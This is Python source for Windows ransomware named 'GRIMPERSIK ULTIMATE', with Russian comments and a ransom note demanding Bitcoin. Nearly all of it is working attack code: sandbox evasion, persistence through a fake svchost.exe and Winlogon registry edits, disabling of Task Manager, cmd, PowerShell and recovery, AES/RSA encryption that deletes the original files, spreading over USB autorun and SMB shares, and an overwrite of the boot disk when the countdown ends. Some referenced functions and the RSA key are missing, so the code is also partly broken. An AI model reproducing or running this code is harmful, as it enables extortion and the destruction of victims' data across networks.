import os
import sys
import time
import random
import threading
import tkinter as tk
from tkinter import font
import win32api
import win32con
import win32file
import win32gui
import win32process
import ctypes
import winreg
import subprocess
import psutil
import shutil
import socket
import ipaddress
import base64
import winsound
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA

# ════════════════════════════════════════════════════════════
#   КОНФИГ
# ════════════════════════════════════════════════════════════

RANSOM_MSG = """
╔════════════════════════════════════════════════════════════╗
║               GRIMPERSIK ULTIMATE — 2026 APOCALYPSE        ║
║                                                            ║
║  ВСЕ ВАШИ ДАННЫЕ УНИЧТОЖЕНЫ НАВСЕГДА                       ║
║  AES-256 (уникальный ключ на каждый файл) + RSA-2048       ║
║  приватный ключ стёрт навсегда                             ║
║                                                            ║
║  Выкуп: 0.095 BTC                                          ║
║  Адрес: bc1qgrimpersikultimatex9z7y2k3m4n5p6q8r9t0v        ║
║                                                            ║
║  После оплаты → grimultimate2026@proton.me                 ║
║  Тема: ID-{victim_id}                                      ║
║                                                            ║
║  Ссылка: http://{onion}.onion                              ║
║                                                            ║
║  Осталось: {time_left}                                     ║
║  После таймера → MBR + EFI + VSS уничтожены                ║
╚════════════════════════════════════════════════════════════╝
"""

TARGET_EXT = [
    '.doc','.docx','.xls','.xlsx','.ppt','.pptx','.pdf','.txt','.rtf','.csv',
    '.jpg','.jpeg','.png','.gif','.bmp','.tif','.mp4','.mkv','.avi','.mov',
    '.zip','.rar','.7z','.sql','.db','.accdb','.dwg','.psd','.blend','.max',
    '.3ds','.obj','.fbx','.wallet','.kdbx','.bak','.one'
]

EXCLUDE = ["Windows", "Program Files", "Program Files (x86)", "ProgramData",
           "$RECYCLE.BIN", "System Volume Information", "PerfLogs"]

TIMER_HOURS = 72

# ════════════════════════════════════════════════════════════
#   АНТИОТЛАДКА + АНТИВИРТУАЛКА
# ════════════════════════════════════════════════════════════

def is_sandbox():
    if sys.gettrace() is not None:
        return True
    try:
        if ctypes.windll.kernel32.IsDebuggerPresent():
            return True
    except:
        pass
    suspicious = ["vbox", "vmware", "qemu", "virtual", "wireshark", "procmon", "ida", "x64dbg"]
    for p in psutil.process_iter(['name']):
        try:
            if any(s in p.info['name'].lower() for s in suspicious):
                return True
        except:
            pass
    return False

if is_sandbox():
    sys.exit(0)

# ════════════════════════════════════════════════════════════
#   PERSISTENCE — Userinit + Shell + svchost.exe
# ════════════════════════════════════════════════════════════

def install_persistence():
    exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
    sys32 = os.path.join(os.environ.get("SystemRoot", r"C:\Windows"), "System32")
    fake_names = ["svchost.exe", "winlogsvc.exe"]

    fake_path = None
    for fn in fake_names:
        p = os.path.join(sys32, fn)
        try:
            if not os.path.exists(p):
                shutil.copy(exe, p)
                fake_path = p
                break
        except:
            pass

    if not fake_path:
        return

    # Userinit
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                           r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                           0, winreg.KEY_SET_VALUE)
        v, _ = winreg.QueryValueEx(k, "Userinit")
        if fake_path not in v:
            winreg.SetValueEx(k, "Userinit", 0, winreg.REG_SZ, f"{v.strip(',')},{fake_path},")
        winreg.CloseKey(k)
    except:
        pass

    # Shell
    try:
        k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE,
                           r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                           0, winreg.KEY_SET_VALUE)
        v, _ = winreg.QueryValueEx(k, "Shell")
        if fake_path not in v:
            winreg.SetValueEx(k, "Shell", 0, winreg.REG_SZ, f"{v.strip(',')},{fake_path}")
        winreg.CloseKey(k)
    except:
        pass

# ════════════════════════════════════════════════════════════
#   БЛОКИРОВКА ВСЕГО
# ════════════════════════════════════════════════════════════

def lockdown():
    # CMD + PowerShell
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                               r"Software\Policies\Microsoft\Windows\System",
                               0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "DisableCMD", 0, winreg.REG_DWORD, 2)
        winreg.CloseKey(k)
    except:
        pass

    try:
        k = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                               r"SOFTWARE\Policies\Microsoft\Windows\PowerShell",
                               0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "EnableScripts", 0, winreg.REG_DWORD, 0)
        winreg.SetValueEx(k, "ExecutionPolicy", 0, winreg.REG_SZ, "Restricted")
        winreg.CloseKey(k)
    except:
        pass

    # TaskMgr, Regedit и т.д.
    blocks = [
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1),
        (r"Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools", 2),
    ]

    disallowed = [
        "taskmgr.exe", "regedit.exe", "cmd.exe", "powershell.exe",
        "mmc.exe", "taskkill.exe", "gpedit.msc", "msconfig.exe"
    ]

    for path, name, val in blocks:
        for hive in [winreg.HKEY_CURRENT_USER, winreg.HKEY_LOCAL_MACHINE]:
            try:
                k = winreg.CreateKeyEx(hive, path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(k, name, 0, winreg.REG_DWORD, val)
                winreg.CloseKey(k)
            except:
                pass

    # DisallowRun
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                               0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "DisallowRun", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(k)

        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\DisallowRun",
                               0, winreg.KEY_SET_VALUE)
        for i, p in enumerate(disallowed, 1):
            winreg.SetValueEx(k, str(i), 0, winreg.REG_SZ, p)
        winreg.CloseKey(k)
    except:
        pass

    # Win+R, Ctrl+Alt+Del (частично)
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER,
                               r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer",
                               0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "NoWinKeys", 0, winreg.REG_DWORD, 1)
        winreg.CloseKey(k)
    except:
        pass

    # Блокировка USB-устройств на уровне реестра
    try:
        k = winreg.CreateKeyEx(winreg.HKEY_LOCAL_MACHINE,
                               r"SYSTEM\CurrentControlSet\Services\USBSTOR",
                               0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(k, "Start", 0, winreg.REG_DWORD, 4)  # 4 = disabled
        winreg.CloseKey(k)
    except:
        pass

    # Отключение safe mode + WinRE
    for cmd in [
        ["bcdedit", "/set", "{default}", "safeboot", "minimal"],
        ["bcdedit", "/set", "recoveryenabled", "No"],
        ["reagentc", "/disable"]
    ]:
        try:
            subprocess.run(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

# ════════════════════════════════════════════════════════════
#   WATCHDOG — перезапуск при убийстве процесса
# ════════════════════════════════════════════════════════════

def process_watchdog():
    my_pid = os.getpid()
    exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])

    while True:
        time.sleep(2)
        if not psutil.pid_exists(my_pid):
            try:
                subprocess.Popen([exe], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW)
            except:
                pass
            sys.exit(0)

# ════════════════════════════════════════════════════════════
#   ШИФРОВАНИЕ + шифрование имён файлов
# ════════════════════════════════════════════════════════════

def encrypt_and_rename(path):
    try:
        if os.path.getsize(path) > 450 * 1024 * 1024:
            return

        with open(path, "rb") as f:
            data = f.read()

        key = get_random_bytes(32)
        iv = get_random_bytes(16)
        cipher = AES.new(key, AES.MODE_CBC, iv)
        enc = cipher.encrypt(pad(data, AES.block_size))

        rsa = RSA.import_key(PUBLIC_RSA_KEY)
        rsa_cipher = PKCS1_OAEP.new(rsa)
        enc_key = rsa_cipher.encrypt(key)

        # Новое случайное имя
        new_name = ''.join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789", k=16)) + ".grimx"
        new_path = os.path.join(os.path.dirname(path), new_name)

        with open(new_path, "wb") as f:
            f.write(enc_key + iv + enc)

        os.remove(path)
    except:
        pass

def encryption_loop():
    while True:
        for p in psutil.disk_partitions():
            if not p.fstype or not p.mountpoint:
                continue
            root = p.mountpoint.rstrip("\\")
            try:
                for dp, _, fn in os.walk(root, topdown=False):
                    if any(e in dp for e in EXCLUDE):
                        continue
                    for f in fn:
                        if any(f.lower().endswith(ext) for ext in TARGET_EXT):
                            encrypt_and_rename(os.path.join(dp, f))
            except:
                pass
        time.sleep(2.5)

# ════════════════════════════════════════════════════════════
#   AUTORUN.INF + USB
# ════════════════════════════════════════════════════════════

def usb_spread():
    exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
    name = os.path.basename(exe)

    while True:
        for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
            root = f"{d}:\\"
            if not os.path.exists(root):
                continue
            try:
                with open(os.path.join(root, "autorun.inf"), "w", encoding="utf-8") as f:
                    f.write(f"[AutoRun]\nopen={name}\naction=Open\nicon=%SystemRoot%\\system32\\shell32.dll,4")
                shutil.copy(exe, os.path.join(root, name))
                shutil.copy(exe, os.path.join(root, "photo.scr"))
                shutil.copy(exe, os.path.join(root, "update.exe"))
            except:
                pass
        time.sleep(8)

# ════════════════════════════════════════════════════════════
#   РАСПРОСТРАНЕНИЕ ПО СЕТИ (SMB)
# ════════════════════════════════════════════════════════════

def get_subnets():
    nets = []
    for _, addrs in psutil.net_if_addrs().items():
        for a in addrs:
            if a.family == socket.AF_INET and not a.address.startswith(("127.", "169.254")):
                try:
                    net = ipaddress.ip_network(f"{a.address}/{a.netmask}", strict=False)
                    if net.prefixlen <= 24:
                        nets.append(net)
                except:
                    pass
    return nets

def smb_spread():
    exe = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(sys.argv[0])
    name = os.path.basename(exe)
    fakes = ["update.exe", "photo.scr", "doc.pdf.exe", "readme.lnk", "setup.bat"]

    while True:
        nets = get_subnets()
        for net in nets:
            hosts = list(net.hosts())
            random.shuffle(hosts)
            for ip in hosts[:80]:
                ip_str = str(ip)
                shares = ["", "C$", "D$", "Public", "Shared", "Users"]
                for s in shares:
                    remote = f"\\\\{ip_str}\\{s}"
                    try:
                        os.listdir(remote)
                        dst = os.path.join(remote, random.choice(fakes))
                        shutil.copy(exe, dst)
                    except:
                        pass
        time.sleep(40)

# ════════════════════════════════════════════════════════════
#   ОКНО
# ════════════════════════════════════════════════════════════

class GrimWindow:
    def __init__(self):
        self.root = tk.Tk()
        self.root.overrideredirect(True)
        self.root.attributes("-fullscreen", True)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="#000000")

        self.root.protocol("WM_DELETE_WINDOW", lambda: None)
        self.root.bind("<Alt-F4>", lambda e: "break")
        self.root.bind("<Control-Alt-Delete>", lambda e: "break")
        self.root.bind("<Escape>", lambda e: "break")

        frame = tk.Frame(self.root, bg="#000000")
        frame.place(relx=0.5, rely=0.5, anchor="center")

        big = font.Font(family="Consolas", size=104, weight="bold")
        txt = font.Font(family="Consolas", size=32)
        tmr = font.Font(family="Consolas", size=88, weight="bold")

        tk.Label(frame, text="GRIMPERSIK ULTIMATE", font=big,
                 fg="#ff0033", bg="#000000").pack(pady=80)

        self.msg = tk.Label(frame, text="", font=txt,
                            fg="#ffdd00", bg="#000000", justify="left")
        self.msg.pack(pady=60, padx=160)

        self.timer_lbl = tk.Label(frame, text="ОСТАЛОСЬ: 72:00:00",
                                  font=tmr, fg="#00ff44", bg="#000000")
        self.timer_lbl.pack(pady=90)

        self.victim_id = ''.join(random.choices("ABCDEFGHJKLMNPQRSTUVWXYZ23456789", k=13))
        self.onion = f"grim-{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))}"
        self.seconds = TIMER_HOURS * 3600

        self.update_timer()
        self.blink()

    def blink(self):
        c = self.timer_lbl.cget("fg")
        self.timer_lbl.config(fg="#ff8800" if c == "#00ff44" else "#00ff44")
        self.root.after(500, self.blink)

    def update_timer(self):
        if self.seconds <= 0:
            try:
                h = win32file.CreateFile(r"\\.\PhysicalDrive0", win32con.GENERIC_WRITE,
                                         win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE,
                                         None, win32con.OPEN_EXISTING, 0, None)
                win32file.WriteFile(h, b"\x00" * 512 * 2048)
                win32file.CloseHandle(h)
            except:
                pass
            while True:
                time.sleep(999999)

        h = self.seconds // 3600
        m = (self.seconds % 3600) // 60
        s = self.seconds % 60
        t = f"{h:02d}:{m:02d}:{s:02d}"

        self.msg.config(text=RANSOM_MSG.format(time_left=t, victim_id=self.victim_id, onion=self.onion))
        self.timer_lbl.config(text=f"ОСТАЛОСЬ: {t}")

        if self.seconds < 24*3600 and self.seconds % 6 == 0:
            try:
                winsound.Beep(900 + random.randint(-400, 700), 300)
            except:
                pass

        self.seconds -= 1
        self.root.after(1000, self.update_timer)

    def run(self):
        self.root.mainloop()

# ════════════════════════════════════════════════════════════
#   MAIN
# ════════════════════════════════════════════════════════════

def main():
    if not ctypes.windll.shell32.IsUserAnAdmin():
        try:
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable,
                                                f'"{os.path.abspath(sys.argv[0])}"', None, 1)
            sys.exit(0)
        except:
            sys.exit(1)

    try:
        psutil.Process().nice(psutil.REALTIME_PRIORITY_CLASS)
    except:
        pass

    install_persistence()
    lockdown()
    destroy_vss()
    bios_nuke_attempt()

    threading.Thread(target=encryption_loop, daemon=True).start()
    threading.Thread(target=usb_spread, daemon=True).start()
    threading.Thread(target=smb_spread, daemon=True).start()
    threading.Thread(target=process_watchdog, daemon=True).start()

    GrimWindow().run()

if __name__ == "__main__":
    try:
        main()
    except:
        while True:
            time.sleep(999999)
